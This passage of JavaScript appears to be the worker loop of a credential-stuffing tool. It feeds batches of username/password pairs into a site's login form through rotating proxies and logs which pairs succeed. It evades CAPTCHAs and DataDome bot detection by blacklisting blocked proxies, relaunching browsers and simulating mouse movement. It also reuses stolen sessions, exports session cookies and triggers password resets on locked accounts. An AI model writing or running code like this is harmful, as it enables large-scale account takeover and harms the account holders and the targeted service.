      if (attempt === 0 && !config.navigation.disableReloadOnFirstAttempt) {
        const reloadResp = await page.reload({
          waitUntil: config.navigation.domWaitUntil,
          timeout: 3000
        }).catch(() => null);

        const newUrl = typeof page.url === 'function' ? page.url() : (page.url || '');
        if (newUrl && newUrl.includes(hostname)) {
          logger.debug('[NAV]', `✓ Navigation successful after reload`);
          return { success: true, response:  reloadResp };
        }
      }
    } catch (e) {
      const msg = (e && e.message && e.message.toLowerCase()) || '';
      const corruptionSignals = [
        'err_aborted',
        'target closed',
        'browser has crashed',
        'browser closed',
        'execution context was destroyed',
        'context was destroyed',
        'session closed',
        'page crashed'
      ];

      if (corruptionSignals.some(sig => msg.includes(sig))) {
        logger.warn('[NAV]', `Browser corruption detected during navigation: ${e.message}`);
        return { success: false, error: 'browser_corrupted' };
      }


      // Browser corruption / crash errors that require browser relaunch
      if (msg.includes('err_aborted') ||
          msg.includes('target closed') ||
          msg.includes('browser has been closed') ||
          msg.includes('execution context was destroyed') ||
          msg.includes('session closed')) {
        logger.warn('[NAV]', `Browser corruption detected: ${e.message}`);
        return { success: false, error: 'browser_corrupted' };
      }

      // Proxy/tunnel errors
      if (msg.includes('tunnel') || msg.includes('proxy') || msg.includes('econnrefused')) {
        logger.warn('[NAV]', `Tunnel/proxy error`);
        return { success: false, error: 'tunnel_failed' };
      }

      if (attempt < retries) {
        await sleep(config.navigation.shortRetryWait);
        continue;
      }
      logger.error('[NAV]', `Navigation failed: ${e.message}`);
      return { success: false, error: e && e.message };
    }
  }

  return { success: false, error: 'max_retries' };
}

/**
 * Clear browser state (cookies, cache) to prevent session leakage between credentials.
 * Called after CAS timeouts and navigation failures to ensure a clean slate.
 */
async function clearBrowserState(page, context) {
  try {
    // Clear all cookies from the browser context
    const cookies = await context.cookies();
    if (cookies.length > 0) {
      await context.clearCookies();
      logger.debug('[CLEANUP]', `Cleared ${cookies.length} cookies`);
    }
  } catch (e) {
    logger.debug('[CLEANUP]', `Cookie cleanup error: ${e.message}`);
  }

  try {
    // Navigate to about:blank to reset page state
    await page.goto('about:blank', { timeout: 5000 });
    logger.debug('[CLEANUP]', 'Page reset to about:blank');
  } catch (e) {
    logger.debug('[CLEANUP]', `Page reset error: ${e.message}`);
  }
}

async function detectBlockOrCaptcha(page, cachedBodyText = null) {
  try {
    const bodyText = cachedBodyText || await page.evaluate(() =>
      document.body && document.body.innerText ? document.body.innerText : ''
    ).catch(() => '');

    if (!bodyText) return false;
    const normalized = bodyText.replace(/\s+/g, ' ').trim().toLowerCase();

    // ACCOUNT-level blocks (permanent — don't retry the credential)
    for (const phrase of (config.detection.accountBlockPhrases || [])) {
      if (normalized.includes(phrase.toLowerCase())) {
        logger.warn('[DETECT]', `Account block detected: ${phrase}`);
        return { type: 'account_blocked', reason: 'account_locked', phrase };
      }
    }

    // IP/PROXY-level blocks (temporary — rotate proxy, retry credential)
    for (const phrase of config.detection.blockPhrases) {
      if (normalized.includes(phrase.toLowerCase())) {
        logger.warn('[DETECT]', `Proxy/IP block phrase detected: ${phrase}`);
        return { type: 'proxy_blocked', reason: 'ip_rate_limited', phrase };
      }
    }

    // Suspicious behavior (proxy-level)
    if (normalized.includes(SUSPICIOUS_BEHAVIOR_PHRASE_NORMALIZED)) {
      logger.warn('[DETECT]', `Suspicious behavior detected (proxy-level)`);
      return { type: 'suspicious_behavior', reason: 'suspicious_behavior' };
    }

    // Bot verification page (proxy-level) - BEFORE generic CAPTCHA check
    // Debug logging for bot check detection
    logger.debug('[DETECT-DEBUG]', `Checking for bot check phrase. Body text length: ${bodyText.length}`);
    logger.debug('[DETECT-DEBUG]', `First 200 chars: ${normalized.substring(0, 200)}`);
    logger.debug('[DETECT-DEBUG]', `Bot check phrase to match: "${BOT_CHECK_PHRASE_NORMALIZED}"`);
    logger.debug('[DETECT-DEBUG]', `Contains bot check phrase: ${normalized.includes(BOT_CHECK_PHRASE_NORMALIZED)}`);
    
    if (normalized.includes(BOT_CHECK_PHRASE_NORMALIZED)) {
      logger.warn('[DETECT]', `Bot verification page detected`);
      return { type: 'bot_check', reason: 'bot_verification_page' };
    }

    // CAPTCHA
    if (normalized.includes(CAPTCHA_PHRASE_NORMALIZED)) {
      logger.warn('[DETECT]', `CAPTCHA detected`);
      return { type: 'captcha', reason: 'captcha_phrase' };
    }

    // Invalid credentials (including account lock due to too many attempts)
    if (normalized.includes(INVALID_CREDENTIALS_PHRASE_NORMALIZED)) {
      logger.warn('[DETECT]', `Invalid credentials phrase detected`);
      return { type: 'invalid_credentials', reason: 'invalid_credentials_phrase' };
    }
    
    if (ACCOUNT_LOCK_PHRASE_NORMALIZED && normalized.includes(ACCOUNT_LOCK_PHRASE_NORMALIZED)) {
      logger.warn('[DETECT]', `Account lock detected (too many login attempts) - password reset available`);
      return { type: 'account_locked', reason: 'account_lock_unlockable' };
    }

  } catch (e) {
    logger.warn('[DETECT]', `Detection error: ${e.message}`);
  }

  return false;
}

// ============ MAIN WORKER LOOP ============

(async () => {
  try {
    // ✅ FIXED:  Ensure all directories exist at startup
    ensureDirectories();
    cleanupStaleTmpDirs(); // ✅ FIX: Remove stale tmp dirs from crashed workers
    loadBlacklist();

    // Receive large payloads via IPC init message (avoids E2BIG env-var limit).
    // Fall back to legacy env vars so the worker can still run standalone.
    const IPC_INIT_TIMEOUT_MS = 5000; // time to wait for controller's init message
    const initData = await new Promise((resolve) => {
      if (!process.send) {
        // Not spawned via fork – use env vars directly
        resolve(null);
        return;
      }
      let resolved = false;
      const onMessage = (msg) => {
        if (msg && msg.type === 'init') {
          resolved = true;
          clearTimeout(initTimer);
          process.removeListener('message', onMessage);
          resolve(msg);
        }
      };
      process.on('message', onMessage);
      // Resolve with null after timeout if no init message arrives
      const initTimer = setTimeout(() => {
        if (!resolved) {
          process.removeListener('message', onMessage);
          resolve(null);
        }
      }, IPC_INIT_TIMEOUT_MS);
    });

    let rawUpstream = (initData && initData.upstream) || process.env.UPSTREAM || '';
    let slice = [];
    let rawProxies = [];
    // Use batchNum from IPC init message; fall back to env var for standalone mode
    const batchNum = (initData && initData.batchNum != null) ? initData.batchNum : (process.env.BATCH_NUM || 0);

    if (initData) {
      slice = Array.isArray(initData.slice) ? initData.slice : [];
      rawProxies = Array.isArray(initData.proxies) ? initData.proxies : [];
    } else {
      try {
        slice = JSON.parse(process.env.SLICE || '[]');
        rawProxies = JSON.parse(process.env.PROXIES || '[]');
      } catch (e) {
        slice = [];
        rawProxies = [];
      }
    }

    if (! slice.length) {
      logger.error('[WORKER]', 'No credentials in slice');
      if (process.send) process.send({ status: 'failed', reason: 'no_slice' });
      process.exit(1);
      return;
    }

    if (!rawProxies.length) {
      logger.error('[WORKER]', 'No proxies available');
      if (process.send) process.send({ status: 'failed', reason: 'no_proxies' });
      process.exit(1);
      return;
    }

    logger.info('[WORKER]', `Processing ${slice.length} credentials`);

    let normalizedUpstream = null;
    let context = null;
    let page = null;

    try {
      if (! rawUpstream) throw new Error('No upstream');
      if (isBlacklisted(rawUpstream)) throw new Error('Upstream blacklisted');

      const norm = normalizeProxyLine(rawUpstream);
      if (!norm) throw new Error('Invalid proxy format');

      const hp = extractHostPort(norm);
      if (!hp) throw new Error('Invalid host: port');

      const reachable = await checkTcpConnect(hp.host, hp.port, 3000);
      if (!reachable) {
        throw new Error('Proxy unreachable');
      }

      normalizedUpstream = norm;
    } catch (e) {
      logger.warn('[WORKER]', `Initial proxy validation failed`);

      try {
        const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
        context = relaunch.context;
        page = relaunch.page;
        globalContext = context;
      } catch (ee) {
        logger.error('[WORKER]', `No valid proxy found`);
        if (process.send) process.send({ status: 'failed', reason: 'no_proxy' });
        process.exit(1);
        return;
      }
    }

    if (!context) {
      if (! normalizedUpstream) {
        logger.error('[WORKER]', 'Invalid upstream');
        if (process.send) process.send({ status: 'failed', reason: 'invalid_upstream' });
        process.exit(1);
        return;
      }

      let localProxy = null;
      let usedSocksDirect = false;

      try {
        if (/^socks/i.test(normalizedUpstream)) {
          localProxy = normalizedUpstream;
          usedSocksDirect = true;
        } else {
          localProxy = await ProxyChain.anonymizeProxy(normalizedUpstream);
        }
      } catch (e) {
        logger.error('[WORKER]', `Proxy setup failed`);
        addToBlacklist(rawUpstream, 'proxy_auth_failed');
        if (process.send) process.send({ status: 'failed', reason: 'proxy_setup_failed' });
        process.exit(1);
        return;
      }

      globalLocalProxy = localProxy;
      globalUsedSocksDirect = usedSocksDirect;

      try {
        const launchResult = await launchBrowser(localProxy);
        context = launchResult.context;
        page = launchResult.page;
        globalContext = context;
      } catch (e) {
        logger.error('[WORKER]', `Browser launch failed`);
        await forceCleanup('launch_failed');
        if (process.send) process.send({ status: 'failed', reason: 'browser_launch_failed' });
        process.exit(1);
        return;
      }
    }

    if (!page) {
      logger.error('[WORKER]', 'No page available');
      await forceCleanup('no_page');
      if (process.send) process.send({ status: 'failed', reason: 'no_page' });
      process.exit(1);
      return;
    }

    logger.info('[NAV]', `Navigating to login page`);
    const maxInitialNavRetries = 3;
    let initialNavSuccess = false;
    for (let navAttempt = 1; navAttempt <= maxInitialNavRetries; navAttempt++) {
      logger.info('[NAV]', `Initial navigation attempt ${navAttempt}/${maxInitialNavRetries}`);
      const initialNav = await navTo(page, config.login.url);
      if (initialNav.success) {
        initialNavSuccess = true;
        break;
      }
      logger.error('[NAV]', `Initial navigation failed (attempt ${navAttempt}/${maxInitialNavRetries}): ${initialNav.error || 'unknown'}`);
      if (initialNav.error === 'tunnel_failed' && navAttempt < maxInitialNavRetries) {
        logger.warn('[NAV]', `Tunnel failed, relaunching browser with new proxy`);
        try {
          const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
          context = relaunch.context;
          page = relaunch.page;
          globalContext = context;
        } catch (e) {
          logger.error('[WORKER]', `Relaunch failed: ${e.message}`);
          if (process.send) process.send({ status: 'failed', reason: 'initial_relaunch_failed' });
          process.exit(1);
          return;
        }
      } else {
        await forceCleanup('initial_nav_failed');
        if (process.send) process.send({ status: 'failed', reason: 'initial_nav_failed' });
        process.exit(1);
        return;
      }
    }
    if (!initialNavSuccess) {
      logger.error('[NAV]', `Initial navigation failed after ${maxInitialNavRetries} attempts`);
      await forceCleanup('initial_nav_failed');
      if (process.send) process.send({ status: 'failed', reason: 'initial_nav_failed' });
      process.exit(1);
      return;
    }

    // ⭐ Dismiss cookie consent popup if present on initial load
    await dismissAllBlockingDialogs(page);

    // ============ INITIAL BLOCK DETECTION WITH RETRY LOOP ============
    let initialBlockRetries = 0;
    const maxInitialRetries = config.proxy.attemptsBeforeGiveUp || 5;

    // Wait for DataDome JS to finish fingerprinting before checking for blocks
    await sleep(rnd(1000, 3000));

    let blockObj = await detectBlockOrCaptcha(page);

    while (blockObj && initialBlockRetries < maxInitialRetries) {
      initialBlockRetries++;
      const blockType = blockObj.type;
      logger.warn('[WORKER]', `Initial block detected (attempt ${initialBlockRetries}/${maxInitialRetries}): ${blockType} — ${blockObj.reason || 'unknown'}`);

      // Notify controller about the blocked proxy for tracking
      if (process.send && blockType !== 'relaunch_failed') {
        process.send({
          type: 'block_detected',
          proxy: rawUpstream,
          blockType: blockType,
          reason: blockObj.reason || 'initial_block',
          timestamp: Date.now()
        });
      }

      // Blacklist the current proxy with appropriate TTL (skip for relaunch failures)
      if (rawUpstream && blockType !== 'relaunch_failed') {
        if (blockType === 'captcha' || blockType === 'bot_check' || blockType === 'suspicious_behavior') {
          addToBlacklist(rawUpstream, blockType === 'captcha' ? 'captcha_triggered' : 'bot_check_triggered');
        } else {
          addToBlacklist(rawUpstream, 'rate_limited');
        }
      }

      await forceCleanup(`initial_${blockType}`);

      try {
        const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
        context = relaunch.context;
        page = relaunch.page;
        globalContext = context;
        await navTo(page, config.login.url);
        await dismissAllBlockingDialogs(page);

        // Wait for DataDome JS to finish fingerprinting on new page
        await sleep(rnd(1000, 3000));

        // Re-check for blocks on the new page
        blockObj = await detectBlockOrCaptcha(page);
      } catch (e) {
        logger.error('[WORKER]', `Relaunch attempt ${initialBlockRetries} failed: ${e.message}`);
        if (initialBlockRetries >= maxInitialRetries) {
          if (process.send) process.send({ status: 'failed', reason: 'all_initial_retries_exhausted' });
          process.exit(1);
          return;
        }
        // Continue retry loop
        blockObj = { type: 'relaunch_failed', reason: e.message };
      }
    }

    if (blockObj && initialBlockRetries >= maxInitialRetries) {
      logger.error('[WORKER]', `All ${maxInitialRetries} initial block retry attempts exhausted. Giving up.`);
      if (process.send) process.send({ status: 'failed', reason: 'all_initial_retries_exhausted' });
      process.exit(1);
      return;
    }

    if (initialBlockRetries > 0 && !blockObj) {
      logger.success('[WORKER]', `✓ Clean page obtained after ${initialBlockRetries} retry attempt(s)`);
    }

    // ============ ADAPTIVE TIMEOUT INITIALIZATION ============
    const adaptiveTimeoutConfig = config.detection.cas.adaptiveTimeout || {};
    const adaptiveTimeout = new AdaptiveDetectionTimeout(
      config.detection.cas.timeout,
      {
        minTimeout: adaptiveTimeoutConfig.minTimeout || 3000,
        maxSamples: adaptiveTimeoutConfig.maxSamples || 20,
        bufferMultiplier: adaptiveTimeoutConfig.bufferMultiplier || 1.5
      }
    );

    let processedCount = 0;

    for (let i = 0; i < slice.length; i++) {
      if (shuttingDown) {
        logger.warn('[WORKER]', `Shutting down, skipping remaining ${slice.length - i} credentials`);
        // Recover unprocessed credentials to retry queue
        for (let j = i; j < slice.length; j++) {
          addToRetryQueue(slice[j], 'worker_shutdown_interrupted');
        }
        break;
      }
      
      const { username, password } = slice[i];
      logger.info('[PROCESSING]', `[${i + 1}/${slice.length}] ${username}`);
      let firstCredentialRetryCount = 0;

      try {
        // ⭐ ============ SESSION REUSE ATTEMPT ============
        let sessionLoaded = false;
        let sessionAttempted = false;
        
        if (sessionManager && sessionManager.hasValidSession(username)) {
          sessionAttempted = true;
          logger.info('[SESSION]', `Valid session found for ${username}, attempting to reuse...`);
          
          try {
            // Navigate to login page first to establish context
            const navResult = await navTo(page, config.login.url);
            if (!navResult.success) {
              if (navResult.error === 'shutting_down' || navResult.error === 'page_closed') {
                logger.warn('[SESSION]', 'Navigation aborted due to shutdown');
                break;  // Exit the loop
              }
              if (navResult.error === 'browser_corrupted') {
                logger.warn('[SESSION]', 'Browser corruption detected before session reuse, relaunching...');
                try {
                  const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
                  context = relaunch.context;
                  page = relaunch.page;
                  globalContext = context;
                } catch (relaunchErr) {
                  logger.error('[SESSION]', `Relaunch failed before session reuse: ${relaunchErr.message}`);
                  throw relaunchErr;
                }
              }
              logger.warn('[SESSION]', `Initial navigation failed, skipping session reuse`);
            } else {
              // Try to load the session
              const loaded = await sessionManager.loadSession(page, username);
              
              if (loaded) {
                // Verify session by navigating to account page
                logger.debug('[SESSION]', `Session loaded, verifying by navigating to account page...`);
                const accountNav = await navTo(page, config.account.url);
                
                if (accountNav.success) {
                  // Check if we're actually logged in
                  const isLoggedIn = await page.evaluate((phrases) => {
                    const bodyText = document.body.innerText.toLowerCase();
                    // Look for logout or account indicators
                    return phrases.some(phrase => bodyText.includes(phrase.toLowerCase()));
                  }, config.account.sessionVerificationPhrases).catch(() => false);
                  
                  if (isLoggedIn) {
                    logger.success('[SESSION]', `✅ Session reused successfully for ${username}`);
                    
                    // Log as success
                    logger.logSuccess(username, password, 'session_reuse', 1.0, 0);
                    
                    // Logout after successful session verification
                    try {
                      const logoutResult = await findAndClickLogoutButton(page, '[LOGOUT]');
                      if (logoutResult.success) {
                        logger.success('[LOGOUT]', `✅ Logout successful via ${logoutResult.method}`);
                      }
                    } catch (logoutError) {
                      logger.warn('[LOGOUT]', `Logout error: ${logoutError?.message}`);
                    }
                    
                    processedCount++;
                    sessionLoaded = true;
                    
                    // Continue to next credential
                    await sleep(rnd(config.form.pauseBetweenCredsMin, config.form.pauseBetweenCredsMax));
                    continue;
                  } else {
                    logger.warn('[SESSION]', `Session loaded but verification failed`);
                    sessionManager.deleteSession(username);
                  }
                } else {
                  logger.warn('[SESSION]', `Session verification navigation failed`);
                  sessionManager.deleteSession(username);
                }
              }
            }
          } catch (sessionError) {
            logger.warn('[SESSION]', `Session reuse error: ${sessionError.message}`);
            // Delete invalid session
            sessionManager.deleteSession(username);
          }
        }
        
        // ⭐ ============ NORMAL LOGIN FLOW ============
        
        // For the first credential in the batch (i === 0), the page was already
        // navigated to the login URL during pre-loop initialization (with anti-bot
        // warmup and cookie popup dismissal). Skip the redundant navigation to
        // preserve anti-bot fingerprint state and prevent the first form submission
        // from being rejected due to incomplete fingerprinting after page reload.
        // If session reuse was attempted, the page may have navigated away, so
        // we must navigate back to the login URL.
        const usePreInitializedPage = (i === 0 && !sessionAttempted);

        if (usePreInitializedPage) {
          logger.debug('[PROCESSING]', 'Using pre-initialized login page for first credential (skipping redundant navigation)');
        } else {
          const navResult = await navTo(page, config.login.url);
          if (!navResult.success) {
            if (navResult.error === 'shutting_down' || navResult.error === 'page_closed') {
              logger.warn('[PROCESSING]', 'Navigation aborted due to shutdown');
              break;  // Exit the loop
            }
            if (navResult.error === 'browser_corrupted') {
              logger.warn('[PROCESSING]', 'Browser corruption detected during navigation, relaunching...');
              try {
                const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
                context = relaunch.context;
                page = relaunch.page;
                globalContext = context;
                const recoveredNav = await navTo(page, config.login.url);
                if (recoveredNav.success) {
                  await dismissAllBlockingDialogs(page);
                  continue;
                }
                logger.error('[PROCESSING]', `Navigation failed after browser relaunch`);
              } catch (relaunchErr) {
                logger.error('[RELAUNCH]', `Browser relaunch after corruption failed: ${relaunchErr.message}`);
              }
            }
            
            let currentUrl = 'unknown';
            try {
              currentUrl = page.url();
            } catch (e) {
              // ignore if page is closed
            }
            logger.error('[PROCESSING]', `Navigation failed to ${config.login.url}`);
            logger.error('[PROCESSING]', `Current URL: ${currentUrl}`);
            logger.error('[PROCESSING]', `Error: ${navResult.error || 'unknown'}`);

            // Handle browser corruption - relaunch browser
            if (navResult.error === 'browser_corrupted') {
              logger.warn('[PROCESSING]', `Browser corruption detected, relaunching browser...`);
              try {
                const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
                context = relaunch.context;
                page = relaunch.page;
                globalContext = context;
                await navTo(page, config.login.url);
                await dismissAllBlockingDialogs(page);
                // Don't increment processedCount, retry the same credential
                continue;
              } catch (e) {
                logger.error('[RELAUNCH]', `Browser relaunch failed: ${e.message}`);
                for (let j = i; j < slice.length; j++) {
                  addToRetryQueue(slice[j], 'relaunch_failed');
                }
                await forceCleanup('relaunch_failed').catch(() => {});
                if (process.send) {
                  process.send({
                    status: 'ok',
                    processed: processedCount,
                    stats: logger.stats,
                    results: {
                      successful: logger.results.successful.length,
                      failed: logger.results.failed.length,
                      blocked: logger.results.blocked.length,
                      captcha: logger.results.captcha.length
                    }
                  });
                }
                process.exit(0);
                return;
              }
            }

            if (navResult.error === 'tunnel_failed') {
              try {
                const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
                context = relaunch.context;
                page = relaunch.page;
                globalContext = context;
                await navTo(page, config.login.url);
                await dismissAllBlockingDialogs(page);
                continue;
              } catch (e) {
                logger.error('[RELAUNCH]', `Tunnel relaunch failed: ${e.message}`);
                for (let j = i; j < slice.length; j++) {
                  addToRetryQueue(slice[j], 'relaunch_failed');
                }
                await forceCleanup('relaunch_failed').catch(() => {});
                if (process.send) {
                  process.send({
                    status: 'ok',
                    processed: processedCount,
                    stats: logger.stats,
                    results: {
                      successful: logger.results.successful.length,
                      failed: logger.results.failed.length,
                      blocked: logger.results.blocked.length,
                      captcha: logger.results.captcha.length
                    }
                  });
                }
                process.exit(0);
                return;
              }
            }
            
            try {
              const hasLoginForm = await page.evaluate(() => {
                return !!(document.querySelector('#username') && document.querySelector('#password'));
              });
              if (hasLoginForm) {
                logger.warn('[PROCESSING]', `Navigation marked as failed, but login form detected. Continuing...`);
                // Don't throw error, continue with login flow
              } else {
                // Clear browser state and retry navigation once before giving up
                await clearBrowserState(page, context);
                const retryNav = await navTo(page, config.login.url);
                if (retryNav.success) {
                  logger.info('[PROCESSING]', `Navigation recovered after clearing browser state`);
                  // Continue with login flow
                } else {
                  // Use the retry error (and include the original for context) to avoid misleading diagnostics
                  const retryError = retryNav.error || 'unknown';
                  const originalError = navResult.error || 'unknown';
                  throw new Error(`Navigation failed after retry: retry=${retryError}, original=${originalError}`);
                }
              }
            } catch (formCheckError) {
              // Covers form detection, browser state reset, and retry navigation — surface the underlying error
              const formErrorMsg = (formCheckError && formCheckError.message) ? formCheckError.message : String(formCheckError || 'unknown');
              const originalError = navResult.error || 'unknown';
              // Log the failure only now that we know the navigation is truly unrecoverable
              logger.logFailed(username, password, 'navigation_failed', `${navResult.error} | Current: ${currentUrl}`);
              throw new Error(`Navigation recovery failed: ${formErrorMsg} (original navigation error=${originalError})`);
            }
          }

          // ⭐ Dismiss cookie consent popup if present on login page
          await dismissAllBlockingDialogs(page);

          // ⭐ FIX: Wait for anti-bot scripts to complete after page navigation.
          // This only applies to the first credential (i === 0) when session reuse
          // was attempted (sessionAttempted === true) — the only scenario that enters
          // this else branch with i === 0. For subsequent credentials (i > 0),
          // anti-bot cookies are already established in the browser context from
          // prior page loads, so no additional wait is needed.
          if (i === 0) {
            logger.debug('[WORKER]', 'Waiting for page scripts to stabilize (first credential after session reuse attempt)');
            await sleep(rnd(1000, 3000));
          }
        }

        // ⭐ COOKIE EXPORT: Capture session data from the successfully loaded login form page
        if (cookieExporter) {
          try {
            const exportPath = await cookieExporter.capture(page, username, config.login.url, process.env.UPSTREAM || null);
            if (exportPath) {
              const exportList = Array.isArray(exportPath) ? exportPath.join(', ') : exportPath;
              logger.info('[COOKIE-EXPORT]', `Session data exported: ${exportList}`);
            }
          } catch (exportErr) {
            logger.warn('[COOKIE-EXPORT]', `Export failed: ${exportErr.message}`);
          }
        }

        blockObj = await detectBlockOrCaptcha(page);
        if (blockObj && blockObj.type === 'proxy_blocked') {
          // PROXY-level block before input — credential was never tested.
          logger.warn('[PROCESSING]', `Proxy block detected before input — requesting controller respawn with new proxy`);

          // Notify controller about the blocked proxy for tracking.
          if (process.send) {
            process.send({
              type: 'block_detected',
              proxy: rawUpstream,
              blockType: 'proxy_blocked',
              reason: blockObj.reason,
              timestamp: Date.now()
            });
          }

          // NOTE: We intentionally do NOT record a 'blocked' credential_result here.
          // The credential was never actually tested (proxy blocked before input), so
          // recording it as 'blocked' could permanently skip it in CredentialHistory.
          // The respawned worker will receive this credential and produce the
          // definitive result.

          // Ask the controller to respawn this worker with a fresh proxy immediately,
          // passing all credentials starting from the current one so the new worker
          // can re-test the blocked credential and process the remaining ones.
          // This avoids the slow internal relaunch loop and lets the controller act
          // right away instead of waiting for the full timeout.
          if (process.send) {
            // Wait for the IPC message to be flushed to the channel before
            // calling cleanup/exit — process.exit() does not wait for pending
            // IPC writes, which could cause the controller to never receive the message.
            // If the send fails (e.g. broken IPC channel), we log and continue: the
            // controller will observe the worker exit and handle the credentials via
            // its worker_crash / no_response recovery path, so no credentials are lost.
            await new Promise((res) => {
              process.send({
                type: 'respawn_with_new_proxy',
                remainingSlice: slice.slice(i),
                reason: blockObj.reason
              }, (err) => {
                if (err) logger.warn('[IPC]', `respawn_with_new_proxy send error (controller will recover via exit handler): ${err.message || err}`);
                res(); // always resolve — cleanup and exit regardless of send outcome
              });
            });
            await forceCleanup('proxy_blocked_respawn').catch(() => {});
            process.exit(0);
          }

          // Fallback: no IPC (standalone mode) — handle proxy rotation internally.
          addToRetryQueue({ username, password }, 'proxy_blocked_before_test');
          consecutiveBlocks++;
          const backoffDelay = getBackoffDelay();
          logger.info('[BACKOFF]', `Progressive backoff: ${backoffDelay}ms (consecutive blocks: ${consecutiveBlocks})`);
          await sleep(backoffDelay);

          try {
            const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
            context = relaunch.context;
            page = relaunch.page;
            globalContext = context;
            await navTo(page, config.login.url);
            await dismissAllBlockingDialogs(page);
            // Don't increment processedCount — credential wasn't tested
            continue;
          } catch (e) {
            logger.error('[RELAUNCH]', `Block relaunch failed: ${e.message}`);
            for (let j = i; j < slice.length; j++) {
              addToRetryQueue(slice[j], 'relaunch_failed');
            }
            await forceCleanup('relaunch_failed').catch(() => {});
            process.exit(0);
            return;
          }
        } else if (blockObj && blockObj.type === 'account_blocked') {
          // ACCOUNT-level block — credential itself is blocked, don't retry
          logger.warn('[PROCESSING]', `Account block detected before input — account is locked`);
          logger.logBlocked(username, password, blockObj.reason, batchNum);
          processedCount++;
          consecutiveBlocks = 0; // Reset backoff for account blocks
          continue;
        } else if (blockObj && blockObj.type === 'account_locked') {
          // ACCOUNT LOCKED (too many attempts) — attempt password reset if enabled
          logger.warn('[PROCESSING]', `Account lock detected before input for ${username}`);
          if (config.passwordReset && config.passwordReset.enabled) {
            const unlockResult = await unlockAccountViaPasswordReset(page, username, config, logger);
            if (unlockResult.success) {
              logger.success('[UNLOCK]', `✅ Password reset requested for ${username} (${unlockResult.details})`);
            } else {
              logger.warn('[UNLOCK]', `❌ Password reset failed for ${username}: ${unlockResult.details}`);
            }
          } else {
            logger.warn('[PROCESSING]', `passwordReset disabled — treating locked account ${username} as failed`);
            logger.logFailed(username, password, 'account_locked_reset_disabled', 'Account locked, password reset disabled in config');
          }
          if (process.send) {
            process.send({
              type: 'credential_result',
              username: username,
              password: password,
              status: 'account_locked',
              reason: blockObj.reason
            });
          }
          processedCount++;
          consecutiveBlocks = 0;
          await clearBrowserState(page, context);
          continue;
        } else if (blockObj && blockObj.type === 'captcha') {
          // CAPTCHA before input — credential was never tested
          logger.warn('[PROCESSING]', `CAPTCHA before input — requesting controller respawn with new proxy`);
          
          // Ban proxy for 5 minutes when CAPTCHA is triggered
          if (rawUpstream) {
            addToBlacklist(rawUpstream, 'captcha_triggered');
          }

          // Notify controller and request respawn with a fresh proxy
          if (process.send) {
            process.send({
              type: 'block_detected',
              proxy: rawUpstream,
              blockType: 'captcha',
              reason: 'captcha_before_test',
              timestamp: Date.now()
            });
            await new Promise((res) => {
              process.send({
                type: 'respawn_with_new_proxy',
                remainingSlice: slice.slice(i),
                reason: 'captcha_before_test'
              }, (err) => {
                if (err) logger.warn('[IPC]', `respawn_with_new_proxy send error (controller will recover via exit handler): ${err.message || err}`);
                res();
              });
            });
            await forceCleanup('captcha_before_test_respawn').catch(() => {});
            process.exit(0);
          }

          // Fallback: no IPC (standalone mode) — handle proxy rotation internally
          addToRetryQueue({ username, password }, 'captcha_before_test');
          consecutiveBlocks++;
          const backoffDelay = getBackoffDelay();
          logger.info('[BACKOFF]', `Progressive backoff: ${backoffDelay}ms (consecutive blocks: ${consecutiveBlocks})`);
          await sleep(backoffDelay);

          try {
            const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
            context = relaunch.context;
            page = relaunch.page;
            globalContext = context;
            await navTo(page, config.login.url);
            await dismissAllBlockingDialogs(page);
            // Don't increment processedCount — credential wasn't tested
            continue;
          } catch (e) {
            logger.error('[RELAUNCH]', `CAPTCHA relaunch failed: ${e.message}`);
            for (let j = i; j < slice.length; j++) {
              addToRetryQueue(slice[j], 'relaunch_failed');
            }
            await forceCleanup('relaunch_failed').catch(() => {});
            process.exit(0);
            return;
          }
        } else if (blockObj && (blockObj.type === 'bot_check' || blockObj.type === 'suspicious_behavior')) {
          // Bot verification page before input — credential was never tested
          logger.warn('[PROCESSING]', `⚠️ Bot verification page detected — requesting controller respawn with new proxy`);
          
          // Blacklist proxy for 10 minutes when bot-check is triggered
          if (rawUpstream) {
            addToBlacklist(rawUpstream, 'bot_check_triggered');
          }

          // Notify controller and request respawn with a fresh proxy
          if (process.send) {
            process.send({
              type: 'block_detected',
              proxy: rawUpstream,
              blockType: blockObj.type,
              reason: 'bot_check_before_test',
              timestamp: Date.now()
            });
            await new Promise((res) => {
              process.send({
                type: 'respawn_with_new_proxy',
                remainingSlice: slice.slice(i),
                reason: 'bot_check_before_test'
              }, (err) => {
                if (err) logger.warn('[IPC]', `respawn_with_new_proxy send error (controller will recover via exit handler): ${err.message || err}`);
                res();
              });
            });
            await forceCleanup('bot_check_before_test_respawn').catch(() => {});
            process.exit(0);
          }

          // Fallback: no IPC (standalone mode) — handle proxy rotation internally
          addToRetryQueue({ username, password }, 'bot_check_before_test');
          consecutiveBlocks++;
          const backoffDelay = getBackoffDelay();
          logger.info('[BACKOFF]', `Progressive backoff: ${backoffDelay}ms (consecutive blocks: ${consecutiveBlocks})`);
          await sleep(backoffDelay);

          try {
            const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
            context = relaunch.context;
            page = relaunch.page;
            globalContext = context;
            await navTo(page, config.login.url);
            await dismissAllBlockingDialogs(page);
            continue;
          } catch (e) {
            logger.error('[RELAUNCH]', `Bot check relaunch failed: ${e.message}`);
            for (let j = i; j < slice.length; j++) {
              addToRetryQueue(slice[j], 'relaunch_failed');
            }
            await forceCleanup('relaunch_failed').catch(() => {});
            process.exit(0);
            return;
          }
        }

        // Random mouse movement BEFORE form fill
        logger.debug('[MOUSE]', `Performing mouse movements before form fill`);
        await mouseMovementBeforeFormFill(page).catch(e => 
          logger.debug('[MOUSE]', `Mouse movement error: ${e.message}`)
        );

        logger.debug('[FORM]', `Filling credentials`);
        const fillResult = await fillForm(page, {
          [config.login.usernameSelector]: username,
          [config.login.passwordSelector]: password
        });

        if (!fillResult.success) {
          logger.warn('[FORM]', `Form fill failed`);
          logger.logFailed(username, password, 'form_fill_failed', 'Could not fill form fields');
          
          // Add to retry queue
          addToRetryQueue({ username, password }, 'form_fill_failed');
          
          processedCount++;
          continue;
        }

        // Random mouse movement DURING form fill (after fill completes)
